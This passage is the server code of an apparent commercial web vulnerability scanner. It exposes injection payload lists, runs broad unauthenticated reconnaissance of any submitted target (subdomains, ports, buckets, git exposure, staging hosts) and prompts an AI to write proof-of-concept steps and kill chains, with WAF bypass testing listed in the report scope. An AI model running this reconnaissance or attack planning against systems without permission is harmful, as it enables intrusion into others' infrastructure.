          pagesScanned: siteStructure.pages.length,
          linksFound: siteStructure.allLinks.size,
          formsFound: siteStructure.allForms.length,
          scriptsFound: siteStructure.allScripts.size,
          parametersFound: siteStructure.allParameters.size,
          endpointsFound: siteStructure.allEndpoints.size,
        } : undefined,
        summary: {
          total: vulnerabilities.length,
          critical: vulnerabilities.filter(v => v.severity === "critical").length,
          high: vulnerabilities.filter(v => v.severity === "high").length,
          medium: vulnerabilities.filter(v => v.severity === "medium").length,
          low: vulnerabilities.filter(v => v.severity === "low").length,
          info: vulnerabilities.filter(v => v.severity === "info").length,
        }
      };

      sendEvent("complete", { result });
      res.end();

    } catch (error: any) {
      sendLog(`FEHLER: ${error.message}`, "FEHLER");
      sendEvent("error", { message: error.message });
      res.end();
    }
  });

  // Get available payloads
  app.get("/api/payloads", (req, res) => {
    res.json({
      sql_injection: SQL_PAYLOADS,
      xss: XSS_PAYLOADS,
      lfi: LFI_PAYLOADS,
      command_injection: CMD_PAYLOADS,
      ssti: SSTI_PAYLOADS,
      ssrf: SSRF_PAYLOADS,
      open_redirect: REDIRECT_PAYLOADS,
      xxe: XXE_PAYLOADS,
    });
  });

  // Real vulnerability intelligence catalog (core + external YAML corpus)
  app.get("/api/vulnerability-catalog", (_req, res) => {
    res.json({
      total: VULNERABILITY_CATALOG.length,
      categories: Object.keys(VULNERABILITY_CATALOG_BY_CATEGORY),
      byCategory: VULNERABILITY_CATALOG_BY_CATEGORY,
      entries: VULNERABILITY_CATALOG,
    });
  });

  // Scope checklist endpoint for full enterprise test coverage planning
  app.get("/api/security-scope-checklist", (_req, res) => {
    const checklist = buildScopeChecklist({
      subdomains: 0,
      dnsRecords: 0,
      ipAddresses: 0,
      wafDetected: 0,
      apiEndpoints: 0,
      jsFiles: 0,
      jsEndpoints: 0,
      parameters: 0,
      backupFiles: 0,
      sensitiveFiles: 0,
      adminPanels: 0,
      directories: 0,
      openPorts: 0,
      cloudFindings: 0,
      promoCodes: 0,
      shineCodes: 0,
    });

    res.json({
      categories: checklist.length,
      tests: checklist.reduce((sum, c) => sum + c.tests.length, 0),
      checklist,
      notes: [
        "Tests marked 'requires-auth-context' need valid accounts, roles, and business workflow setup.",
        "Run /api/scan/stream to get dynamic status evidence per target.",
      ],
    });
  });

  // Deep reconnaissance endpoint: infra mapping, endpoint intel, and scope expansion.
  app.post("/api/recon/deep", async (req, res) => {
    try {
      const input = (req.body?.targetUrl || req.body?.target || req.query?.targetUrl || req.query?.target || "") as string;
      if (!input || typeof input !== "string") {
        return res.status(400).json({ error: "targetUrl is required" });
      }

      let normalized = input.trim();
      if (!normalized.startsWith("http")) normalized = `https://${normalized}`;

      let parsed: URL;
      try {
        parsed = new URL(normalized);
      } catch {
        return res.status(400).json({ error: "Invalid URL format" });
      }

      const maxPagesRaw = Number(req.body?.maxPages ?? req.query?.maxPages ?? 25);
      const maxPages = Number.isFinite(maxPagesRaw) ? Math.max(5, Math.min(100, Math.trunc(maxPagesRaw))) : 25;
      const waybackLimitRaw = Number(req.body?.waybackLimit ?? req.query?.waybackLimit ?? 250);
      const waybackLimit = Number.isFinite(waybackLimitRaw) ? Math.max(25, Math.min(1000, Math.trunc(waybackLimitRaw))) : 250;

      const baseUrl = `${parsed.protocol}//${parsed.host}`;
      const baseDomain = getBaseDomain(parsed.hostname);

      const mainResponse = await fetchWithTimeout(normalized, {}, 15000);
      const headers = mainResponse.headers || {};
      const body = mainResponse.body || "";

      const [
        realIPs,
        dnsRecords,
        openPorts,
        sslCertificate,
        whoisInfo,
        subdomains,
        waybackUrls,
        cloudBuckets,
        gitExposure,
        resolverDrift,
      ] = await Promise.all([
        getRealIP(parsed.hostname),
        enumerateDNS(parsed.hostname),
        scanPorts(parsed.hostname),
        parsed.protocol === "https:" ? analyzeSSL(parsed.hostname) : Promise.resolve(null),
        lookupWhois(baseDomain),
        enumerateSubdomains(baseDomain),
        fetchWaybackUrls(baseDomain, waybackLimit),
        scanCloudBuckets(baseDomain),
        checkGitExposure(baseUrl),
        compareResolvers(parsed.hostname),
      ]);

      const crawlStructure = await crawlWebsite(normalized, baseUrl, maxPages, () => {});
      const jsIntel = await analyzeJavaScriptIntel(Array.from(crawlStructure.allScripts), baseUrl);

      const waybackEndpointUrls = waybackUrls.map((w) => w.url).filter(Boolean);
      const crawlEndpoints = Array.from(crawlStructure.allEndpoints);
      const crawlLinks = Array.from(crawlStructure.allLinks);
      const allEndpointCandidates = Array.from(new Set<string>([
        ...crawlEndpoints,
        ...crawlLinks,
        ...jsIntel.endpoints,
        ...waybackEndpointUrls,
      ])).slice(0, 1200);

      const endpointCategories: Record<string, number> = {
        api: 0,
        auth: 0,
        admin: 0,
        upload: 0,
        payment: 0,
        graphql: 0,
        websocket: 0,
        mobile: 0,
        "internal-or-nonprod": 0,
      };

      const endpointCategoryMap = new Map<string, string[]>();
      for (const endpoint of allEndpointCandidates) {
        const tags = classifyEndpointPath(endpoint);
        endpointCategoryMap.set(endpoint, tags);
        for (const tag of tags) {
          if (endpointCategories[tag] === undefined) endpointCategories[tag] = 0;
          endpointCategories[tag]++;
        }
      }

      const hiddenParams = Array.from(new Set([
        ...parseQueryParamsFromUrls(allEndpointCandidates),
        ...Array.from(crawlStructure.allParameters),
        ...jsIntel.parameters,
      ])).slice(0, 400);

      const hostsFromUrls = Array.from(new Set(
        allEndpointCandidates.map((entry) => {
          try {
            return new URL(entry).hostname;
          } catch {
            return "";
          }
        }).filter((h): h is string => Boolean(h))
      ));

      const relatedHosts = Array.from(new Set([
        parsed.hostname,
        ...subdomains.map((s) => s.subdomain),
        ...hostsFromUrls.filter((host) => host === baseDomain || host.endsWith(`.${baseDomain}`)),
      ])).slice(0, 100);

      const cnameTargets = relatedHosts.slice(0, 25);
      const cnameChains = await Promise.all(cnameTargets.map((host) => resolveCnameChain(host)));

      const danglingCandidates: Array<{ host: string; reason: string }> = [];
      for (const chain of cnameChains) {
        if (chain.chain.length === 0) continue;
        if (!chain.notes.includes("cloud-cname-target")) continue;
        const hostIps = await getRealIP(chain.host);
        if (hostIps.length === 0) {
          danglingCandidates.push({
            host: chain.host,
            reason: `CNAME points to cloud target (${chain.chain[chain.chain.length - 1]}) but no A/AAAA record resolved`,
          });
        }
      }

      const cleanIps = Array.from(new Set(realIPs.map((ip) => ip.replace(/^\[|\]$/g, ""))));
      const asn = await Promise.all(cleanIps.slice(0, 15).map((ip) => lookupAsn(ip)));

      const reverseDns: Array<{ ip: string; ptr: string[] }> = [];
      for (const ip of cleanIps.slice(0, 15)) {
        try {
          const ptr = await dns.promises.reverse(ip);
          reverseDns.push({ ip, ptr: Array.from(new Set(ptr || [])) });
        } catch {
          reverseDns.push({ ip, ptr: [] });
        }
      }

      const stagingHosts = relatedHosts.filter((host) => {
        const lower = host.toLowerCase();
        return DEV_STAGING_HINTS.some((hint) => lower.includes(hint));
      }).slice(0, 25);

      const stagingReachability: Array<{ host: string; url: string; status?: number; reachable: boolean }> = [];
      for (const host of stagingHosts) {
        const probes = [`https://${host}/`, `http://${host}/`];
        let probeResult: { host: string; url: string; status?: number; reachable: boolean } = {
          host,
          url: probes[0],
          reachable: false,
        };

        for (const probe of probes) {
          try {
            const resp = await fetchWithTimeout(probe, {}, 4000);
            if (resp.status && resp.status > 0) {
              probeResult = { host, url: probe, status: resp.status, reachable: true };
              break;
            }
          } catch {
            // Continue trying the next protocol.
          }
        }

        stagingReachability.push(probeResult);
      }

      const protections = detectProtection(headers, body);
      const techStack = detectTechStack(headers, body);
      const cloudHints = inferCloudInfra(dnsRecords, cnameChains);

      const result = {
        engine: "TEUFEL SHIELD Deep Recon",
        targetUrl: normalized,
        baseDomain,
        timestamp: new Date().toISOString(),
        reconnaissance: {
          statusCode: mainResponse.status,
          resolvedIPs: realIPs,
          ipRanges: Array.from(new Set(cleanIps.map((ip) => getIpRangeHint(ip)))),
          asn,
          reverseDns,
          dnsRecords,
          resolverDrift,
          cnameChains,
          danglingCandidates,
          whois: whoisInfo,
          sslCertificate: sslCertificate || undefined,
          openPorts,
          subdomains,
          stagingReachability,
          wayback: {
            total: waybackUrls.length,
            sample: waybackUrls.slice(0, 100),
          },
        },
        attackSurface: {
          technologies: techStack,
          protections,
          cloudHints,
          cloudBuckets,
          gitExposure,
          endpointCount: allEndpointCandidates.length,
          endpointCategories,
          endpointSamples: allEndpointCandidates.slice(0, 250).map((endpoint) => ({
            endpoint,
            tags: endpointCategoryMap.get(endpoint) || [],
          })),
          parameters: hiddenParams,
          javascriptIntel: {
            files: jsIntel.jsFiles,
            endpoints: jsIntel.endpoints,
            parameters: jsIntel.parameters,
            sensitiveSignals: jsIntel.sensitiveSignals,
            promoCodes: jsIntel.promoCodes,
            shineCodes: jsIntel.shineCodes,
          },
          crawlStats: {
            pages: crawlStructure.pages.length,
            links: crawlStructure.allLinks.size,
            forms: crawlStructure.allForms.length,
            scripts: crawlStructure.allScripts.size,
            endpoints: crawlStructure.allEndpoints.size,
          },
        },
        coverageNotes: [
          "Business-logic, authorization matrix, and authenticated workflow tests require valid multi-role accounts.",
          "Dynamic mobile/API behavior may reveal additional endpoints behind authenticated sessions.",
          "Race-condition and multi-step transaction abuse checks require controlled concurrency test harness.",
        ],
      };

      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error?.message || "Deep reconnaissance failed" });
    }
  });

  // AI Analysis endpoint - Real Claude AI-powered security analysis with key rotation
  app.post("/api/ai-analyze", async (req, res) => {
    try {
      const { scanResult, language } = req.body;
      if (!scanResult) {
        return res.status(400).json({ error: "Scan result required" });
      }
      
      const lang = language || "de";
      const vulns = scanResult.vulnerabilities || [];
      const summary = scanResult.summary || {};
      const critical = summary.critical || vulns.filter((v: any) => v.severity === "critical").length;
      const high = summary.high || vulns.filter((v: any) => v.severity === "high").length;
      const medium = summary.medium || vulns.filter((v: any) => v.severity === "medium").length;
      const low = summary.low || vulns.filter((v: any) => v.severity === "low").length;
      const total = critical + high + medium + low;

      // Check if Claude API keys are available
      if (CLAUDE_API_KEYS.length === 0) {
        // Fallback to local analysis if no keys
        return res.json({ 
          analysis: generateLocalAnalysis(scanResult, lang, vulns, summary, critical, high, medium, low, total),
          source: "local",
          keyUsed: 0
        });
      }

      // Build scan data summary for the AI
      const scanDataSummary = buildScanDataForAI(scanResult, vulns, summary);

      const systemPrompt = lang === "de" 
        ? `Du bist TEUFEL SHIELD AI, ein Elite-Cybersicherheitsanalyst von GAP PROTECTION (gap-protection.pro). 
Analysiere die folgenden Scan-Ergebnisse und erstelle einen detaillierten, professionellen Sicherheitsbericht auf Deutsch.
Dein Bericht muss folgende Abschnitte enthalten:
1. GESAMTBEWERTUNG - Risikostufe und Zusammenfassung
2. KRITISCHE BEFUNDE - Die gefährlichsten Schwachstellen mit Erklärung
3. DETAILLIERTE ANALYSE - Jede Schwachstelle mit CVSS, CWE, OWASP-Referenz, Angriffsvektor und technische Details
4. SERVERANALYSE - Server-Technologien, offene Ports, SSL-Status, DNS
5. ANGRIFFSVEKTOREN - Wie ein Angreifer diese Schwachstellen ausnutzen könnte
6. EMPFEHLUNGEN - Priorisierte Maßnahmen (SOFORT/DRINGEND/EMPFOHLEN/OPTIONAL)
7. COMPLIANCE - Relevante Standards (OWASP Top 10, CIS, NIST)
Verwende klare Formatierung mit ═══ und ━━━ für Abschnitte. Sei technisch präzise und professionell.`
        : `You are TEUFEL SHIELD AI, an elite cybersecurity analyst from GAP PROTECTION (gap-protection.pro).
Analyze the following scan results and produce a detailed, professional security report in English.
Your report must include these sections:
1. OVERALL ASSESSMENT - Risk level and summary
2. CRITICAL FINDINGS - Most dangerous vulnerabilities with explanation
3. DETAILED ANALYSIS - Each vulnerability with CVSS, CWE, OWASP reference, attack vector and technical details
4. SERVER ANALYSIS - Server technologies, open ports, SSL status, DNS
5. ATTACK VECTORS - How an attacker could exploit these vulnerabilities
6. RECOMMENDATIONS - Prioritized actions (IMMEDIATE/URGENT/RECOMMENDED/OPTIONAL)
7. COMPLIANCE - Relevant standards (OWASP Top 10, CIS, NIST)
Use clear formatting with ═══ and ━━━ for sections. Be technically precise and professional.`;

      const userMessage = `Analyze this security scan result:\n\n${scanDataSummary}`;

      try {
        const result = await callClaudeAPI(systemPrompt, userMessage);
        
        const header = lang === "de" 
          ? `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - KI-SICHERHEITSANALYSE (Claude AI)
═══════════════════════════════════════════════════════════════
ZIEL: ${scanResult.targetUrl}
ANALYSEDATUM: ${new Date().toLocaleString("de-DE")}
AI-ENGINE: Claude | Key #${result.keyUsed}
═══════════════════════════════════════════════════════════════\n\n`
          : `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - AI SECURITY ANALYSIS (Claude AI)
═══════════════════════════════════════════════════════════════
TARGET: ${scanResult.targetUrl}
ANALYSIS DATE: ${new Date().toLocaleString("en-US")}
AI ENGINE: Claude | Key #${result.keyUsed}
═══════════════════════════════════════════════════════════════\n\n`;

        res.json({ 
          analysis: header + result.text,
          source: "claude",
          keyUsed: result.keyUsed
        });
      } catch (aiError: any) {
        console.log(`[TEUFEL AI] All Claude keys failed, falling back to local analysis: ${aiError.message}`);
        res.json({ 
          analysis: generateLocalAnalysis(scanResult, lang, vulns, summary, critical, high, medium, low, total),
          source: "local-fallback",
          keyUsed: 0,
          aiError: aiError.message
        });
      }
    } catch (error: any) {
      res.status(500).json({ error: error.message || "AI analysis failed" });
    }
  });

  // Deep AI Scan - Multi-pass analysis with key rotation
  app.post("/api/ai-deep-scan", async (req, res) => {
    try {
      const { scanResult, language } = req.body;
      if (!scanResult) {
        return res.status(400).json({ error: "Scan result required" });
      }
      
      if (CLAUDE_API_KEYS.length === 0) {
        return res.status(400).json({ error: "No AI API keys configured" });
      }

      const lang = language || "de";
      const scanDataSummary = buildScanDataForAI(scanResult, scanResult.vulnerabilities || [], scanResult.summary || {});
      
      // Multi-pass AI analysis - each pass uses the next available key
      const passes = [
        {
          name: lang === "de" ? "SCHWACHSTELLEN-TIEFENANALYSE" : "VULNERABILITY DEEP ANALYSIS",
          system: lang === "de"
            ? "Du bist ein Penetration-Testing-Experte. Analysiere jede gefundene Schwachstelle im Detail. Bewerte den CVSS-Score, erkläre den Angriffsvektor, zeige Proof-of-Concept Schritte und gib spezifische Remediation-Schritte. Formatiere professionell mit ═══ Trennlinien."
            : "You are a penetration testing expert. Analyze each found vulnerability in detail. Rate the CVSS score, explain the attack vector, show proof-of-concept steps and give specific remediation steps. Format professionally with ═══ separators."
        },
        {
          name: lang === "de" ? "INFRASTRUKTUR-ANALYSE" : "INFRASTRUCTURE ANALYSIS", 
          system: lang === "de"
            ? "Du bist ein Infrastruktur-Sicherheitsexperte. Analysiere die Server-Konfiguration, offene Ports, SSL/TLS-Setup, DNS-Konfiguration und Netzwerk-Exposure. Identifiziere Fehlkonfigurationen und empfehle Hardening-Maßnahmen. Formatiere professionell."
            : "You are an infrastructure security expert. Analyze server configuration, open ports, SSL/TLS setup, DNS configuration and network exposure. Identify misconfigurations and recommend hardening measures. Format professionally."
        },
        {
          name: lang === "de" ? "ANGRIFFSSZENARIEN & RISIKOBEWERTUNG" : "ATTACK SCENARIOS & RISK ASSESSMENT",
          system: lang === "de"
            ? "Du bist ein Red-Team-Spezialist. Basierend auf den Scan-Ergebnissen, erstelle realistische Angriffsszenarien. Beschreibe Kill-Chains, laterale Bewegungsmöglichkeiten und potentielle Auswirkungen. Bewerte das Gesamtrisiko und erstelle eine Risk-Matrix. Formatiere professionell."
            : "You are a red team specialist. Based on scan results, create realistic attack scenarios. Describe kill chains, lateral movement possibilities and potential impact. Assess overall risk and create a risk matrix. Format professionally."
        }
      ];

      let fullAnalysis = lang === "de"
        ? `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - KI-TIEFENANALYSE (Multi-Pass)
═══════════════════════════════════════════════════════════════
ZIEL: ${scanResult.targetUrl}
ANALYSEDATUM: ${new Date().toLocaleString("de-DE")}
ANALYSE-MODUS: Multi-Pass Deep Scan (${passes.length} Durchgänge)
VERFÜGBARE KEYS: ${CLAUDE_API_KEYS.length}
═══════════════════════════════════════════════════════════════\n\n`
        : `═══════════════════════════════════════════════════════════════
TEUFEL SHIELD - AI DEEP ANALYSIS (Multi-Pass)
═══════════════════════════════════════════════════════════════
TARGET: ${scanResult.targetUrl}
ANALYSIS DATE: ${new Date().toLocaleString("en-US")}
ANALYSIS MODE: Multi-Pass Deep Scan (${passes.length} passes)
AVAILABLE KEYS: ${CLAUDE_API_KEYS.length}
═══════════════════════════════════════════════════════════════\n\n`;

      const passResults: { name: string; status: string; keyUsed: number }[] = [];

      for (let i = 0; i < passes.length; i++) {
        const pass = passes[i];
        fullAnalysis += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PASS ${i + 1}/${passes.length}: ${pass.name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

        try {
          const result = await callClaudeAPI(pass.system, `Scan data:\n${scanDataSummary}`);
          fullAnalysis += result.text + "\n";
          passResults.push({ name: pass.name, status: "success", keyUsed: result.keyUsed });
        } catch (err: any) {
          const errorMsg = lang === "de" 
            ? `[FEHLER] Dieser Durchgang konnte nicht abgeschlossen werden: ${err.message}`
            : `[ERROR] This pass could not be completed: ${err.message}`;
          fullAnalysis += errorMsg + "\n";
          passResults.push({ name: pass.name, status: "failed", keyUsed: 0 });
        }
      }

      fullAnalysis += `\n═══════════════════════════════════════════════════════════════
TEUFEL SHIELD | GAP PROTECTION
${lang === "de" ? "Professionelle Cybersicherheit" : "Professional Cybersecurity"} | gap-protection.pro
═══════════════════════════════════════════════════════════════`;

      res.json({ 
        analysis: fullAnalysis,
        source: "claude-deep",
        passes: passResults,
        totalPasses: passes.length,
        successfulPasses: passResults.filter(p => p.status === "success").length
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Deep AI scan failed" });
    }
  });

  // AI Key Status endpoint
  app.get("/api/ai-status", (_req, res) => {
    res.json({
      totalKeys: CLAUDE_API_KEYS.length,
      activeKeys: CLAUDE_API_KEYS.length - failedKeys.size,
      failedKeys: failedKeys.size,
      currentKeyIndex,
      model: CLAUDE_MODEL,
      configured: CLAUDE_API_KEYS.length > 0
    });
  });

  // Generate PDF Report
  app.post("/api/generate-pdf", async (req, res) => {
    try {
      const scanResult = req.body;
      const lang = scanResult.language || "de";
      
      if (!scanResult || !scanResult.targetUrl) {
        return res.status(400).json({ error: "Invalid scan result" });
      }

      const PDFDocument = (await import("pdfkit")).default;
      const doc = new PDFDocument({ size: "A4", margin: 50, bufferPages: true });
      
      const chunks: Buffer[] = [];
      doc.on("data", (chunk: Buffer) => chunks.push(chunk));
      
      const pdfReady = new Promise<Buffer>((resolve) => {
        doc.on("end", () => resolve(Buffer.concat(chunks)));
      });

      // Colors
      const navy = "#0f172a";
      const darkBlue = "#1e3a5f";
      const accentBlue = "#3b82f6";
      const red = "#dc2626";
      const orange = "#ea580c";
      const yellow = "#ca8a04";
      const green = "#16a34a";
      const gray = "#64748b";
      const lightGray = "#f1f5f9";
      const white = "#ffffff";
      
      const summary = scanResult.summary || {};
      const total = summary.total || scanResult.vulnerabilities?.length || 0;
      const critical = summary.critical || 0;
      const high = summary.high || 0;
      const medium = summary.medium || 0;
      const low = summary.low || 0;
      const info = summary.info || 0;

      // ── PAGE 1: Cover ──
      doc.rect(0, 0, 595, 842).fill(navy);
      
      // Logo area
      const fs = await import("fs");
      const path = await import("path");
      const logoPath = path.resolve(__dirname, "public", "gap-og.png");
      const altLogoPath = path.resolve(__dirname, "..", "client", "public", "gap-og.png");
      const logo = fs.existsSync(logoPath) ? logoPath : fs.existsSync(altLogoPath) ? altLogoPath : null;
      if (logo) { try { doc.image(logo, 200, 80, { width: 195 }); } catch {} }
      
      // Title - TEUFEL Shield branding
      doc.fillColor(white).fontSize(36).font("Helvetica-Bold").text("TEUFEL SHIELD", 0, 220, { width: 595, align: "center" });
      doc.fontSize(12).font("Helvetica").text("GAP PROTECTION", 0, 260, { width: 595, align: "center" });
      doc.fontSize(14).font("Helvetica").text(lang === "de" ? "Professioneller Sicherheitsbericht" : "Enterprise Vulnerability Assessment Report", 0, 280, { width: 595, align: "center" });
      
      // Divider line
      doc.moveTo(150, 310).lineTo(445, 310).lineWidth(2).strokeColor(accentBlue).stroke();
      
      // Target info
      doc.fillColor("#94a3b8").fontSize(11).font("Helvetica");
      doc.text(`Target: ${scanResult.targetUrl}`, 0, 340, { width: 595, align: "center" });
      doc.text(`Scan Date: ${new Date(scanResult.timestamp || Date.now()).toLocaleString("de-DE")}`, 0, 360, { width: 595, align: "center" });
      doc.text(`Duration: ${scanResult.duration || "N/A"}`, 0, 380, { width: 595, align: "center" });
      
      // Risk score badge
      let riskGrade = "A+";
      let riskColor = green;
      let riskLabel = "Excellent";
      if (critical > 0) { riskGrade = "F"; riskColor = red; riskLabel = "Critical Risk"; }
      else if (high > 3) { riskGrade = "D"; riskColor = orange; riskLabel = "High Risk"; }
      else if (high > 0) { riskGrade = "C"; riskColor = orange; riskLabel = "Moderate Risk"; }
      else if (medium > 5) { riskGrade = "B-"; riskColor = yellow; riskLabel = "Low-Moderate Risk"; }
      else if (medium > 0) { riskGrade = "B+"; riskColor = yellow; riskLabel = "Low Risk"; }
      else if (low > 0) { riskGrade = "A"; riskColor = green; riskLabel = "Minimal Risk"; }
      
      // Risk circle
      doc.circle(297, 490, 60).fill(riskColor);
      doc.fillColor(white).fontSize(40).font("Helvetica-Bold").text(riskGrade, 0, 465, { width: 595, align: "center" });
      doc.fontSize(11).font("Helvetica").text(riskLabel, 0, 560, { width: 595, align: "center" });
      
      // Stats row
      const statsY = 610;
      const statsLabels = lang === "de" 
        ? ["Gesamt", "Kritisch", "Hoch", "Mittel", "Niedrig"]
        : ["Total", "Critical", "High", "Medium", "Low"];
      const statsData = [
        { label: statsLabels[0], value: total, color: white },
        { label: statsLabels[1], value: critical, color: red },
        { label: statsLabels[2], value: high, color: orange },
        { label: statsLabels[3], value: medium, color: yellow },
        { label: statsLabels[4], value: low, color: green },
      ];
      statsData.forEach((s, i) => {
        const x = 50 + i * 105;
        doc.rect(x, statsY, 90, 55).fill("#1e293b");
        doc.fillColor(s.color).fontSize(22).font("Helvetica-Bold").text(String(s.value), x, statsY + 5, { width: 90, align: "center" });
        doc.fillColor("#94a3b8").fontSize(9).font("Helvetica").text(s.label, x, statsY + 35, { width: 90, align: "center" });
      });
      
      // Footer on cover
      doc.fillColor("#475569").fontSize(8).text("TEUFEL SHIELD | gap-protection.pro | Professional Cybersecurity", 0, 770, { width: 595, align: "center" });
      doc.text(`Report ID: GAP-${Date.now().toString(36).toUpperCase()} | ${lang === "de" ? "VERTRAULICH" : "CONFIDENTIAL"}`, 0, 783, { width: 595, align: "center" });
      
      // ── PAGE 2: Executive Summary ──
      doc.addPage();
      
      // Header bar
      doc.rect(0, 0, 595, 45).fill(navy);
      doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - " + (lang === "de" ? "Sicherheitsbericht" : "Security Report"), 50, 14);
      doc.fillColor("#94a3b8").fontSize(8).text(scanResult.targetUrl, 400, 16);
      
      doc.fillColor(navy).fontSize(18).font("Helvetica-Bold").text(lang === "de" ? "Zusammenfassung" : "Executive Summary", 50, 65);
      doc.moveTo(50, 87).lineTo(545, 87).lineWidth(1).strokeColor(accentBlue).stroke();
      
      // Executive summary text
      doc.fillColor("#334155").fontSize(10).font("Helvetica");
      let execText = "";
      if (lang === "de") {
        execText = `Diese automatisierte Sicherheitsbewertung wurde gegen ${scanResult.targetUrl} `;
        execText += `am ${new Date(scanResult.timestamp || Date.now()).toLocaleString("de-DE")} durchgefuehrt. `;
        execText += `Der Scan hat insgesamt ${total} Sicherheitsproblem${total !== 1 ? 'e' : ''} identifiziert, darunter `;
        execText += `${critical} kritische, ${high} hohe, ${medium} mittlere und ${low} niedrige Schwachstelle${low !== 1 ? 'n' : ''}. `;
        if (critical > 0) execText += `SOFORTIGE MASSNAHMEN ERFORDERLICH um die kritischen Schwachstellen zu beheben. `;
        else if (high > 0) execText += `Hohe Prioritaet: Schwachstellen sollten innerhalb von 7 Tagen behoben werden. `;
        else execText += `Die allgemeine Sicherheitslage ist akzeptabel mit kleineren Verbesserungsempfehlungen. `;
      } else {
        execText = `This automated security assessment was conducted against ${scanResult.targetUrl} `;
        execText += `on ${new Date(scanResult.timestamp || Date.now()).toLocaleString("en-US")}. `;
        execText += `The scan identified a total of ${total} security finding${total !== 1 ? 's' : ''}, including `;
        execText += `${critical} critical, ${high} high, ${medium} medium, and ${low} low severity issue${low !== 1 ? 's' : ''}. `;
        if (critical > 0) execText += `IMMEDIATE ACTION IS REQUIRED to address the critical vulnerabilities identified. `;
        else if (high > 0) execText += `High-priority issues should be remediated within 7 days. `;
        else execText += `The overall security posture is acceptable with minor improvements recommended. `;
      }
      doc.text(execText, 50, 100, { width: 495, lineGap: 3 });
      
      let yPos = 170;
      
      // Scan Scope
      doc.fillColor(navy).fontSize(13).font("Helvetica-Bold").text("Scan Scope & Methodology", 50, yPos);
      yPos += 20;
      doc.fillColor("#334155").fontSize(9).font("Helvetica");
      const phases = scanResult.phases || [];
      const scopeItems = [
        "SSL/TLS Certificate & Configuration Analysis",
        "HTTP Security Headers Assessment (OWASP)",
        "DNS Security Records (SPF, DMARC, DKIM, DNSSEC)",
        "Port Scanning & Service Detection",
        "Web Application Vulnerability Testing (SQL Injection, XSS, SSRF, LFI, etc.)",
        "Subdomain Enumeration & Analysis",
        "Admin Panel & Sensitive File Discovery",
        "Directory Brute-Force Scanning",
        "Cookie & Session Security Analysis",
        "Wayback Machine Historical Data",
        "WAF Detection & Bypass Testing",
        "CVSS v3.1 Severity Scoring",
      ];
      scopeItems.forEach(item => {
        doc.fillColor(accentBlue).fontSize(9).text("●", 55, yPos);
        doc.fillColor("#334155").text(item, 70, yPos, { width: 475 });
        yPos += 14;
      });
      
      yPos += 15;
      
      // Server Information
      if (scanResult.serverInfo) {
        doc.fillColor(navy).fontSize(13).font("Helvetica-Bold").text("Server Information", 50, yPos);
        yPos += 20;
        doc.rect(50, yPos, 495, 80).fill(lightGray);
        doc.fillColor("#334155").fontSize(9).font("Helvetica");
        const si = scanResult.serverInfo;
        if (si.server) { doc.text(`Server: ${si.server}`, 65, yPos + 10); }
        if (si.ip) { doc.text(`IP Address: ${si.ip}`, 65, yPos + 25); }
        if (si.poweredBy) { doc.text(`Powered By: ${si.poweredBy}`, 65, yPos + 40); }
        if (si.technologies?.length) { doc.text(`Technologies: ${si.technologies.join(', ')}`, 65, yPos + 55, { width: 465 }); }
        yPos += 95;
      }
      
      // SSL Certificate Info
      if (scanResult.sslInfo) {
        yPos += 10;
        doc.fillColor(navy).fontSize(13).font("Helvetica-Bold").text("SSL/TLS Certificate", 50, yPos);
        yPos += 20;
        doc.rect(50, yPos, 495, 65).fill(lightGray);
        doc.fillColor("#334155").fontSize(9).font("Helvetica");
        const ssl = scanResult.sslInfo;
        doc.text(`Issuer: ${ssl.issuer || 'N/A'}`, 65, yPos + 10);
        doc.text(`Valid Until: ${ssl.validTo || 'N/A'}`, 65, yPos + 25);
        doc.text(`Protocol: ${ssl.protocol || 'N/A'}`, 65, yPos + 40);
        doc.text(`Days Remaining: ${ssl.daysRemaining ?? 'N/A'}`, 300, yPos + 40);
        yPos += 80;
      }
      
      // ── PAGE 3+: Vulnerability Details ──
      doc.addPage();
      doc.rect(0, 0, 595, 45).fill(navy);
      doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - Vulnerability Assessment Report", 50, 14);
      doc.fillColor("#94a3b8").fontSize(8).text("Detailed Findings", 420, 16);
      
      yPos = 65;
      doc.fillColor(navy).fontSize(18).font("Helvetica-Bold").text("Detailed Vulnerability Findings", 50, yPos);
      yPos += 25;
      doc.moveTo(50, yPos).lineTo(545, yPos).lineWidth(1).strokeColor(accentBlue).stroke();
      yPos += 15;
      
      const vulns = scanResult.vulnerabilities || [];
      
      // Sort by severity
      const sevOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
      const sortedVulns = [...vulns].sort((a: any, b: any) => (sevOrder[a.severity] ?? 5) - (sevOrder[b.severity] ?? 5));
      
      for (let i = 0; i < sortedVulns.length; i++) {
        const v = sortedVulns[i];
        const needHeight = 95 + (v.recommendation ? 15 : 0) + (v.evidence ? 15 : 0);
        
        if (yPos > 700) {
          doc.addPage();
          doc.rect(0, 0, 595, 45).fill(navy);
          doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - Vulnerability Assessment Report", 50, 14);
          doc.fillColor("#94a3b8").fontSize(8).text(`Findings (continued)`, 420, 16);
          yPos = 60;
        }
        
        const sevColor = v.severity === "critical" ? red : v.severity === "high" ? orange : v.severity === "medium" ? yellow : v.severity === "low" ? green : gray;
        
        // Finding card
        doc.rect(50, yPos, 495, needHeight).fill("#fafbfc").strokeColor("#e2e8f0").lineWidth(0.5).stroke();
        doc.rect(50, yPos, 5, needHeight).fill(sevColor);
        
        // Finding number and title
        doc.fillColor(navy).fontSize(10).font("Helvetica-Bold").text(`#${i + 1} - ${(v.type || v.title || "Unknown").replace(/_/g, " ").toUpperCase()}`, 65, yPos + 8, { width: 350 });
        
        // Severity badge
        const badgeX = 460;
        doc.rect(badgeX, yPos + 6, 75, 16).fill(sevColor);
        doc.fillColor(white).fontSize(8).font("Helvetica-Bold").text((v.severity || "").toUpperCase(), badgeX, yPos + 10, { width: 75, align: "center" });
        
        // CVSS Score
        let innerY = yPos + 28;
        if (v.cvss?.score) {
